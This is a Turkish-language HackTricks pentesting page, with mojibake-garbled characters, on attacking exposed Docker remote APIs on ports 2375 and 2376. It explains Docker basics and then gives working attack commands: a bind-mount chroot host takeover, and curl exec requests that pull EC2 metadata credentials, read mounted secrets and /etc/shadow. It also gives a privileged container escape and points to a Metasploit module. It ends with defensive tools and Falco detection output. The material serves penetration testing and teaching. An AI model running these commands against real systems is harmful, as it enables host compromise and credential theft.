# 2375, 2376 Docker Pentest

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> adlÄ± <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWS hackleme</strong></a><strong> eÄŸitiminden sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) **karanlÄ±k aÄŸ** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini kontrol etmek iÃ§in Ã¼cretsiz** iÅŸlevler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

***

### Docker Temelleri

#### Nedir

Docker, **konteynerleÅŸtirme endÃ¼strisindeki Ã¶ncÃ¼ platformdur** ve **sÃ¼rekli yenilikleri Ã¶ncÃ¼lÃ¼k eder**. UygulamalarÄ±n **gelenekselden geleceÄŸe kadar uzanan** kolayca oluÅŸturulmasÄ±nÄ± ve daÄŸÄ±tÄ±lmasÄ±nÄ± saÄŸlar ve bunlarÄ±n **Ã§eÅŸitli ortamlarda gÃ¼venli bir ÅŸekilde daÄŸÄ±tÄ±lmasÄ±nÄ±** garanti eder.

#### Temel docker mimarisi

* [**containerd**](http://containerd.io): Bu, konteynerlerin **yaÅŸam dÃ¶ngÃ¼sÃ¼nÃ¼n kapsamlÄ± yÃ¶netiminden sorumlu** olan **Ã§ekirdek Ã§alÄ±ÅŸma zamanÄ±dÄ±r**. Bu, konteynerlerin **gÃ¶rÃ¼ntÃ¼ transferi ve depolanmasÄ±**nÄ± ele almanÄ±n yanÄ± sÄ±ra konteynerlerin **yÃ¼rÃ¼tÃ¼lmesi, izlenmesi ve aÄŸlanmasÄ±**nÄ± denetler. **containerd** hakkÄ±nda **daha detaylÄ± bilgiler** sunulmaktadÄ±r.
* **Container-shim**, **baÅŸsÄ±z konteynerlerin** iÅŸlenmesinde **aracÄ±** olarak kritik bir rol oynar ve konteynerler baÅŸlatÄ±ldÄ±ktan sonra **runc**'Ä±n yerini alÄ±r.
* [**runc**](http://runc.io): Hafif ve evrensel konteyner Ã§alÄ±ÅŸma zamanÄ± yetenekleriyle saygÄ± gÃ¶ren runc, **OCI standardÄ±** ile uyumludur. **OCI yÃ¶nergelerine** gÃ¶re konteynerleri **baÅŸlatmak ve yÃ¶netmek** iÃ§in containerd tarafÄ±ndan kullanÄ±lÄ±r ve orijinal **libcontainer**'dan evrim geÃ§irmiÅŸtir.
* [**grpc**](http://www.grpc.io), containerd ve **docker-engine** arasÄ±ndaki iletiÅŸimi **kolaylaÅŸtÄ±rmak** iÃ§in esastÄ±r ve **verimli etkileÅŸimi** saÄŸlar.
* [**OCI**](https://www.opencontainers.org), en son Docker sÃ¼rÃ¼mlerinin hem **OCI gÃ¶rÃ¼ntÃ¼sÃ¼** hem de **Ã§alÄ±ÅŸma zamanÄ±** standartlarÄ±na **uyumlu** olduÄŸunu korumak iÃ§in Ã¶nemlidir. 

#### Temel komutlar
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd**, Ã¶zellikle **Docker ve Kubernetes** gibi konteyner platformlarÄ±nÄ±n ihtiyaÃ§larÄ±nÄ± karÅŸÄ±lamak Ã¼zere geliÅŸtirilmiÅŸtir. Linux, Windows, Solaris ve daha fazlasÄ± gibi Ã§eÅŸitli iÅŸletim sistemlerinde konteynerlerin yÃ¼rÃ¼tÃ¼lmesini **basitleÅŸtirmeyi amaÃ§lar**, iÅŸletim sistemiyle ilgili iÅŸlevselliÄŸi ve sistem Ã§aÄŸrÄ±larÄ±nÄ± soyutlayarak. Containerd'Ä±n amacÄ±, kullanÄ±cÄ±larÄ±nÄ±n gereksinim duyduÄŸu temel Ã¶zellikleri iÃ§ermek ve gereksiz bileÅŸenleri atlamaya Ã§alÄ±ÅŸmaktÄ±r. Ancak, bu hedefi tamamen gerÃ§ekleÅŸtirmek zorlu olarak kabul edilmektedir.

Bir ana tasarÄ±m kararÄ±, **Containerd'Ä±n aÄŸ iÅŸlemlerini ele almamasÄ±dÄ±r**. AÄŸ, daÄŸÄ±tÄ±lmÄ±ÅŸ sistemlerde kritik bir unsurdur ve YazÄ±lÄ±m TanÄ±mlÄ± AÄŸ (SDN) ve hizmet keÅŸfi gibi karmaÅŸÄ±klÄ±klar, bir platformdan diÄŸerine Ã¶nemli Ã¶lÃ§Ã¼de deÄŸiÅŸmektedir. Bu nedenle, Containerd, desteklediÄŸi platformlar tarafÄ±ndan yÃ¶netilen aÄŸ yÃ¶nlerini bÄ±rakÄ±r.

**Docker, konteynerleri Ã§alÄ±ÅŸtÄ±rmak iÃ§in Containerd'Ä± kullanÄ±rken**, Containerd'Ä±n yalnÄ±zca Docker'Ä±n iÅŸlevlerinin bir alt kÃ¼mesini desteklediÄŸi Ã¶nemlidir. Ã–zellikle, Containerd, Docker'da bulunan aÄŸ yÃ¶netimi yeteneklerine sahip deÄŸildir ve Docker sÃ¼rÃ¼mlerinin doÄŸrudan oluÅŸturulmasÄ±nÄ± desteklemez. Bu ayrÄ±m, Containerd'Ä±n odaklÄ± rolÃ¼nÃ¼ vurgular; konteyner Ã§alÄ±ÅŸma zamanÄ± ortamÄ± olarak, daha Ã¶zelleÅŸmiÅŸ iÅŸlevleri entegre olduÄŸu platformlara bÄ±rakÄ±r.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman**, Red Hat tarafÄ±ndan geliÅŸtirilen ve sÃ¼rdÃ¼rÃ¼len [AÃ§Ä±k Konteyner Ä°nisiyatifi (OCI) standartlarÄ±na](https://github.com/opencontainers) uygun olan aÃ§Ä±k kaynaklÄ± bir konteyner motorudur. Docker'dan farklÄ± olarak, **daemonless mimarisi** ve **rootless konteynerler** desteÄŸi ile dikkat Ã§eker, kullanÄ±cÄ±lara kÃ¶k ayrÄ±calÄ±klarÄ± olmadan konteyner Ã§alÄ±ÅŸtÄ±rma imkanÄ± saÄŸlar.

Podman, Docker'Ä±n API'si ile uyumlu olacak ÅŸekilde tasarlanmÄ±ÅŸtÄ±r, bu da Docker CLI komutlarÄ±nÄ±n kullanÄ±lmasÄ±na olanak tanÄ±r. Bu uyumluluk, **Buildah** gibi konteyner gÃ¶rÃ¼ntÃ¼leri oluÅŸturmak iÃ§in ve **Skopeo** gibi gÃ¶rÃ¼ntÃ¼ iÅŸlemleri iÃ§in araÃ§larÄ± iÃ§eren ekosistemi de kapsar. Bu araÃ§lar hakkÄ±nda daha fazla detay [GitHub sayfalarÄ±nda](https://github.com/containers/buildah/tree/master/docs/containertools) bulunabilir.

**Ana Farklar**

* **Mimari**: Arkaplan daemonu olmadan Docker'Ä±n istemci-sunucu modelinin aksine, Podman bir daemon olmadan Ã§alÄ±ÅŸÄ±r. Bu tasarÄ±m, konteynerlerin baÅŸlatan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±yla Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar ve kÃ¶k eriÅŸimi gereksinimini ortadan kaldÄ±rarak gÃ¼venliÄŸi artÄ±rÄ±r.
* **Systemd Entegrasyonu**: Podman, konteynerleri yÃ¶netmek iÃ§in **systemd** ile entegre Ã§alÄ±ÅŸÄ±r, systemd birimleri aracÄ±lÄ±ÄŸÄ±yla konteyner yÃ¶netimine olanak tanÄ±r. Bu, Docker'Ä±n systemd'i genellikle Docker daemon iÅŸlemini yÃ¶netmek iÃ§in kullandÄ±ÄŸÄ±ndan farklÄ±dÄ±r.
* **Rootless Konteynerler**: Podman'Ä±n Ã¶nemli bir Ã¶zelliÄŸi, konteynerleri baÅŸlatan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ± altÄ±nda Ã§alÄ±ÅŸtÄ±rabilme yeteneÄŸidir. Bu yaklaÅŸÄ±m, saldÄ±rganlarÄ±n sadece tehlikeye atÄ±lan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ± deÄŸil kÃ¶k eriÅŸimini elde etmelerini saÄŸlayarak konteyner ihlalleri ile iliÅŸkili riskleri en aza indirir.

Podman'Ä±n yaklaÅŸÄ±mÄ±, kullanÄ±cÄ± ayrÄ±calÄ±k yÃ¶netimine ve mevcut Docker iÅŸ akÄ±ÅŸlarÄ±yla uyumluluÄŸa vurgu yaparak gÃ¼venli ve esnek bir Docker alternatifi sunar.

{% hint style="info" %}
Podman'Ä±n Docker ile aynÄ± API'yi desteklemeyi amaÃ§ladÄ±ÄŸÄ±nÄ± unutmayÄ±n, bu nedenle podman ile docker gibi aynÄ± komutlarÄ± kullanabilirsiniz:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Temel Bilgiler

Uzak API varsayÄ±lan olarak etkinleÅŸtirildiÄŸinde 2375 baÄŸlantÄ± noktasÄ±nda Ã§alÄ±ÅŸÄ±r. Hizmet varsayÄ±lan olarak kimlik doÄŸrulama gerektirmeyecektir, bu da bir saldÄ±rganÄ±n ayrÄ±calÄ±klÄ± bir docker konteyneri baÅŸlatmasÄ±na olanak tanÄ±r. Uzak API kullanÄ±larak bir kiÅŸi, ana bilgisayarÄ±n ortamÄ±nÄ±n dosyalarÄ±nÄ± okuyabilir/yazabilir ve ana bilgisayarlarÄ± konteynere baÄŸlayabilir.

**VarsayÄ±lan baÄŸlantÄ± noktasÄ±:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### NumaralandÄ±rma

#### Manuel

Docker API'sÄ±nÄ± numaralandÄ±rmak iÃ§in `docker` komutunu veya aÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi `curl` kullanabilirsiniz:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
EÄŸer **docker** komutu ile **uzak docker API'sine baÄŸlanabilirseniz**, hizmetle etkileÅŸimde bulunmak iÃ§in Ã¶nceden yorumlanmÄ±ÅŸ olan **docker** [**komutlarÄ±nÄ±** Ã§alÄ±ÅŸtÄ±rabilirsiniz](2375-pentesting-docker.md#basic-commands).

{% hint style="info" %}
`export DOCKER_HOST="tcp://localhost:2375"` yapabilir ve **docker** komutunda `-H` parametresini kullanmaktan **kaÃ§Ä±nabilirsiniz**
{% endhint %}

**HÄ±zlÄ± ayrÄ±calÄ±k yÃ¼kseltme**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Bazen **2376**'yÄ± **TLS** uÃ§ noktasÄ± iÃ§in gÃ¶rebilirsiniz. Docker istemcisi ile baÄŸlantÄ± kuramadÄ±m ama curl ile yapmak mÃ¼mkÃ¼n.
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
EÄŸer bununla ilgili daha fazla bilgi istiyorsan, komutlarÄ± kopyaladÄ±ÄŸÄ±m yerde daha fazla bilgi bulunabilir: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Otomatik
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Kompromis

AÅŸaÄŸÄ±daki sayfada bir **docker konteynerinden kaÃ§manÄ±n** yollarÄ±nÄ± bulabilirsiniz:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Bunu istismar ederek bir konteynerden kaÃ§mak mÃ¼mkÃ¼ndÃ¼r, uzaktaki makinede zayÄ±f bir konteyner Ã§alÄ±ÅŸtÄ±rabilir, ondan kaÃ§abilir ve makineyi tehlikeye atabilirsiniz:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Yetki YÃ¼kseltme

EÄŸer bir docker kullanan bir ana makine iÃ§indeyseniz, [**yetkileri yÃ¼kseltmeyi denemek iÃ§in bu bilgileri okuyabilirsiniz**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Ã‡alÄ±ÅŸan Docker konteynerlerinde sÄ±rlarÄ± keÅŸfetmek
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
**env** (Ã§evresel deÄŸiÅŸken bÃ¶lÃ¼mÃ¼) bÃ¶lÃ¼mÃ¼nde sÄ±rlar iÃ§in kontrol yapÄ±n ve ÅŸunlarÄ± bulabilirsiniz:

* Åifreler.
* IP'ler.
* Portlar.
* Yollar.
* DiÄŸerleriâ€¦ .

Dosya Ã§Ä±karmak istiyorsanÄ±z:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Docker'Ä±nÄ±zÄ± GÃ¼vence AltÄ±na Alma

#### Docker kurulumunuzu ve kullanÄ±mÄ±nÄ±zÄ± gÃ¼vence altÄ±na alma

* Mevcut docker kurulumunuzu incelemek iÃ§in [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) aracÄ±nÄ± kullanabilirsiniz.
* `./docker-bench-security.sh`
* Mevcut docker kurulumunuzu incelemek iÃ§in [https://github.com/kost/dockscan](https://github.com/kost/dockscan) aracÄ±nÄ± kullanabilirsiniz.
* `dockscan -v unix:///var/run/docker.sock`
* FarklÄ± gÃ¼venlik seÃ§enekleriyle Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir konteynerin sahip olacaÄŸÄ± ayrÄ±calÄ±klarÄ± gÃ¶rmek iÃ§in [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) aracÄ±nÄ± kullanabilirsiniz. Bu, bir konteyneri Ã§alÄ±ÅŸtÄ±rmak iÃ§in bazÄ± gÃ¼venlik seÃ§eneklerini kullanmanÄ±n sonuÃ§larÄ±nÄ± bilmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Docker Ä°majlarÄ±nÄ± GÃ¼vence AltÄ±na Alma

* DiÄŸer docker imajlarÄ±nÄ±zÄ± tarayarak zayÄ±flÄ±klarÄ± bulmak iÃ§in [https://github.com/quay/clair](https://github.com/quay/clair) docker imajÄ±nÄ± kullanabilirsiniz.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Docker DosyalarÄ±nÄ± GÃ¼vence AltÄ±na Alma

* Docker dosyanÄ±zÄ± incelemek ve tÃ¼m tÃ¼rden yan yapÄ±landÄ±rmalarÄ± bulmak iÃ§in [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) aracÄ±nÄ± kullanabilirsiniz. Her yan yapÄ±landÄ±rmaya bir kimlik verilecek, her birini nasÄ±l dÃ¼zelteceÄŸinizi [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) buradan bulabilirsiniz.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

* Docker dosyanÄ±zÄ± incelemek ve tÃ¼m tÃ¼rden yan yapÄ±landÄ±rmalarÄ± bulmak iÃ§in [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) aracÄ±nÄ± kullanabilirsiniz.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* Docker dosyanÄ±zÄ± incelemek ve tÃ¼m tÃ¼rden yan yapÄ±landÄ±rmalarÄ± bulmak iÃ§in [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) aracÄ±nÄ± kullanabilirsiniz.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* Docker dosyanÄ±zÄ± incelemek ve tÃ¼m tÃ¼rden yan yapÄ±landÄ±rmalarÄ± bulmak iÃ§in [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) aracÄ±nÄ± kullanabilirsiniz.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### ÅÃ¼pheli Etkinlikleri GÃ¼nlÃ¼ÄŸe Kaydetme

* Ã‡alÄ±ÅŸan konteynerlerdeki ÅŸÃ¼pheli davranÄ±ÅŸlarÄ± tespit etmek iÃ§in [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) aracÄ±nÄ± kullanabilirsiniz.
* AÅŸaÄŸÄ±daki parÃ§ada **Falco'nun bir Ã§ekirdek modÃ¼lÃ¼ derlediÄŸini ve eklediÄŸini** gÃ¶rebilirsiniz. Bundan sonra, kurallarÄ± yÃ¼kler ve **ÅŸÃ¼pheli etkinlikleri kaydetmeye baÅŸlar**. Bu durumda, baÅŸlatÄ±lan 2 ayrÄ±calÄ±klÄ± konteyner tespit edildi, bunlardan biri hassas bir baÄŸlantÄ± noktasÄ±yla ve birkaÃ§ saniye sonra konteynerlerden birinde bir kabuk aÃ§Ä±ldÄ±ÄŸÄ± tespit edildi.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Docker'Ä± Ä°zleme

Docker'Ä± izlemek iÃ§in auditd kullanabilirsiniz.

### Referanslar

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlÄ±k aÄŸ** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevler sunar.

WhiteIntel'in asÄ±l amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve **Ã¼cretsiz** olarak motorlarÄ±nÄ± deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
